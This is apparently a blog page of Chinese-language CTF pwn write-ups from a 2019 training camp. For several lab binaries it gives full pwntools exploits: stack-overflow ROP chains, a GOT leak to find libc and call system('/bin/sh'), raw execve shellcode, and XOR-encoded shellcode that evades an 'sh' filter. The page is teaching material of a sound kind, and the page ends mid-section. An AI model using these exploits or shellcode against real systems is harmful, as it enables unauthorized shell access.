<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">e = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">buf2_addr = <span class="number">0x0804a100</span></span><br><span class="line">payload1 = <span class="number">36</span> *<span class="string">"a"</span> + p32(e.symbols[<span class="string">"read"</span>]) + p32(buf2_addr)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)+p32(buf2_addr)+p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="simple-stackoverflow2-nx"><a href="#simple-stackoverflow2-nx" class="headerlink" title="simple_stackoverflow2_nx"></a>simple_stackoverflow2_nx</h2><p>先看看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">24</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">1023</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看看IDA反汇编出来的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> overflow();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下开启的保护措施</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看到和上一题最大的不同点就是开启了NX防护，这样子的话我们的栈就变为了不可执行，通过检查也的确是这样的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x0804835c 0x080485e8 rx-p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08048154 0x08048714 r--p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br><span class="line">0x08049f08 0x0804a06c rw-p	/home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx</span><br></pre></td></tr></table></figure>

<p>但是我们依然有办法执行系统调用<code>system(&quot;/bin/sh&quot;)</code></p>
<p>利用 ropgadget，我们可以查看是否有 <code>/bin/sh</code> 存在</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx$ ROPgadget --binary simple_stackoverflow2_nx --string '/bin/sh' </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>

<p>可以知道不存在<code>/bin/sh</code></p>
<p>查找一下是否有<code>system</code> 函数存在。经在 ida 中查找，不存在。</p>
<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
<ul>
<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 </li>
<li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li>
</ul>
<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
<ul>
<li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li>
</ul>
<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
<ul>
<li>泄露 __libc_start_main 地址</li>
<li>获取 libc 版本</li>
<li>获取 system 地址与 /bin/sh 的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行 system(‘/bin/sh’)</li>
</ul>
<p>我们一般通过<code>write</code>函数来泄漏libc的相关地址信息</p>
<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数。且需注意地址置为要调用的函数地址，注意是got地址而不是plt地址。</p>
<p>则我们的payload1可以写为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow) + p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>

<p>因为我们要重复利用<code>overflow</code>函数，故返回地址需要设置为<code>overflow</code>的起始地址</p>
<p>但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write()</code>函数就够了，因为我们可以通过<code>write()</code>函数把中的<code>write()</code>函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的<code>write()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write()</code>会根据<code>write.got</code>跳转到真正的<code>write()</code>函数上去。</p>
<p>因为<code>system()</code>函数和<code>write()</code>在<code>libc.so</code>中的<code>offset(相对地址)</code>是不变的，所以如果我们得到了<code>write()</code>的地址并且拥有目标服务器上的<code>libc.so</code>就可以根据已知的<code>write()</code>的地址和偏移量计算出<code>system()</code>在内存中的地址了。</p>
<p>偏移量也可以使用<code>pwntools</code>来进行计算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_set = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure>

<p>所以libc的基地址也可以计算</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - off_set</span><br></pre></td></tr></table></figure>

<p>则我们的payload2可以写为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br></pre></td></tr></table></figure>

<p>最终的Exploit为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	p = process(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	leave_ret = <span class="number">0x80484FC</span><span class="comment">#overflow leave ret</span></span><br><span class="line">	overflow = <span class="number">0x080484DB</span></span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow)</span><br><span class="line">	payload += p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br><span class="line">	</span><br><span class="line">	p.send(payload)</span><br><span class="line">	</span><br><span class="line">	libc.address = u32(p.recv(<span class="number">4</span>))<span class="number">-0xd5b70</span></span><br><span class="line">	info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line">	</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	elf = ELF(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">	libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<p>这题的Exploit还有一种写法，我还不是很能理解，到时候我再填坑吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line">bss = <span class="number">0x0804A200</span></span><br><span class="line">write_plt = <span class="number">0x080483C0</span></span><br><span class="line">read_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_got = <span class="number">0x0804A010</span></span><br><span class="line">setbuf_plt = elf.plt[<span class="string">'setbuf'</span>]</span><br><span class="line">setbuf_got = elf.got[<span class="string">'setbuf'</span>]</span><br><span class="line">pppr = <span class="number">0x080485c9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io, <span class="string">"b *0x80484FD \nc"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line">attach()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(setbuf_plt)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(setbuf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendline('a'*36 + p32(ret_addr) + 'a' *32 + shellcode)</span></span><br><span class="line">io.send(<span class="string">'a'</span>*<span class="number">36</span> + payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">setbuf_addr = u32(io.read(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">"setbuf_addr:%08x"</span> % setbuf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setbuf_offset = <span class="number">0x0065ff0</span></span><br><span class="line">libc.address = setbuf_addr - setbuf_offset</span><br><span class="line">log.info(<span class="string">"libc:%08x"</span> % libc.address)</span><br><span class="line"></span><br><span class="line">payload2 = p32(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/" class="post-title-link" itemprop="url">XMAN-2019-福州-PWN-ShellCode</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-06 07:33:47 / Modified: 22:38:10" itemprop="dateCreated datePublished" datetime="2019-08-06T07:33:47-07:00">2019-08-06</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本次XMAN-2019福州站的夏令营的Pwn专题中，关于ShellCode的题目主要有两题：shellcode和shellcode2，都是很基础的题目。我最喜欢的环节是哪个关于ShellCode如何绕过的互动环节，听到了很多种不同的思路，虽然自己也做出来了，但是没发现大家还有还有这么多不同的思路，感觉自己的思维得到了非常大的拓展。本来PWN题的解法就有很多，十分渴望可以听到各种不同的思路。</p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>首先放源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode, <span class="number">1023</span>);</span><br><span class="line">    (*(<span class="keyword">void</span> (*)()) shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过IDA Pro反汇编出来的代码为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下防护措施</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到有很明显的攻击漏洞，程序会直接读取我们输入的东西并执行，我们只需要构造ShellCode并传入即可</p>
<p>构造的shellcode应该是这样的,执行的即为<code>system（&quot;/bin/sh\x00&quot;)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push <span class="number">0x68732f2f</span></span><br><span class="line">push <span class="number">0x6e69622f</span></span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">cltd</span><br><span class="line">move al, <span class="number">0xb</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>

<p>Exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./shellcode"</span>)</span><br><span class="line"><span class="comment">#p = remote("120.79.114.39",10001)</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode += <span class="string">"\x0b\xcd\x80"</span></span><br><span class="line">payload = shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="shellcode2"><a href="#shellcode2" class="headerlink" title="shellcode2"></a>shellcode2</h2><p>首先通过IDA Pro反汇编出来的代码为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  read(<span class="number">0</span>, shellcode, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(shellcode, <span class="string">"sh"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"shellcode detected!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查一下防护措施</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>和上一题的不同之处在于，这题多了一个对输入内容的检测，如果输入的内容包含“sh“字符就会报错，所以我们要想办法绕过这个检查</p>
<p>我们所想的第一种办法，把我们的<code>/bin/sh</code>字符串进行异或操作，绕过字符检查，然后再异或回原来的字符串即可。shellcode就可以像这样写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push <span class="number">0xa28d9591</span></span><br><span class="line">xor dword ptr [esp],<span class="number">0xcafebabe</span><span class="string">"</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">mov al, 11</span></span><br><span class="line"><span class="string">int 0x80</span></span><br></pre></td></tr></table></figure>

<p>最后的Exploit就可以这样写</p>
